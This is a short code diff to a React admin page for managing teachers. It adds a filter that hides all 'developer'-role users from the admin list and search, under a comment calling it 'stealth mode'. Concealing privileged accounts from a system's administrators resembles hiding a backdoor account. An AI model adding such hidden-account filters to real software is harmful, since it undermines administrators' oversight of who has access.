@@ -91,10 +91,14 @@ export default function AdminTeachers() {
 
   const getRole = (userId: string) => roles.find(r => r.user_id === userId);
   const isAdmin = (userId: string) => getRole(userId)?.role === "admin";
+  const isDeveloper = (userId: string) => roles.some(r => r.user_id === userId && r.role === "developer");
+
+  // Hide developer users from the list (stealth mode)
+  const visibleTeachers = teachers.filter(t => !isDeveloper(t.id));
 
   const filteredTeachers = searchQuery.trim()
-    ? teachers.filter(t => t.email?.toLowerCase().includes(searchQuery.toLowerCase().trim()))
-    : teachers;
+    ? visibleTeachers.filter(t => t.email?.toLowerCase().includes(searchQuery.toLowerCase().trim()))
+    : visibleTeachers;
 
   const fetchPermissions = async (userId: string) => {
     const { data } = await supabase.from("user_permissions").select("*").eq("user_id", userId);
